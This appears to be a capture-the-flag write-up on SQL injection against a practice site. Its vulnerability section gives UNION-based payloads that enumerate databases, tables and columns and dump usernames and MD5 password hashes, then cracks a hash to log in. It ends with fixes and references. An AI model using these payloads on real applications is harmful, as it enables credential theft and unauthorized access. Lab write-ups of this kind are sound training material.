# SQL injection

## Vulnerability

* List databases (as in `SHOW DATABASES`)
```sql
null union select null,schema_name from information_schema.schemata
```
* List tables in the `Member_Brute_Force` (hex 
`0x4d656d6265725f42727574655f466f726365`) database
```sql
null union select null,table_name from information_schema.tables where
 table_schema=0x4d656d6265725f42727574655f466f726365
```
* List columns in `db_default` table
(`db_default` <-> hex `0x64625f64656661756c74`)
```sql
null union select null,column_name from information_schema.columns where table_name=0x64625f64656661756c74
```
* Select `username` and `password` columns in `Member_Brute_Force` table
```sql
null union select username,password from Member_Brute_Force.db_default
```
* See output
```
username: root
password: 3bf1114a986ba87ed28fc1b5884fc2f8

username: admin
password: 3bf1114a986ba87ed28fc1b5884fc2f8
```
* Find corresponding string for this hash https://md5hashing.net/hash/md5/3bf1114a986ba87ed28fc1b5884fc2f8
* MD5 `3bf1114a986ba87ed28fc1b5884fc2f8` <-> `shadow`
* Sign in with either `admin` or `root` as username and `shadow` as password
* Get the flag

## Attack

A SQL injection attack consists of insertion or “injection” of a SQL query via 
the input data from the client to the application. 

## Fix
* Use prepared Statements (with Parameterized Queries)
* Avoid dynamically construct a SQL query. Don't simply concatenate strings
 including user inputs to construct SQL query
* Validate parameters from the client 

## References
https://portswigger.net/web-security/sql-injection/union-attacks
https://en.wikipedia.org/wiki/Information_schema
https://dev.mysql.com/doc/refman/5.7/en/information-schema-schemata-table.html
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
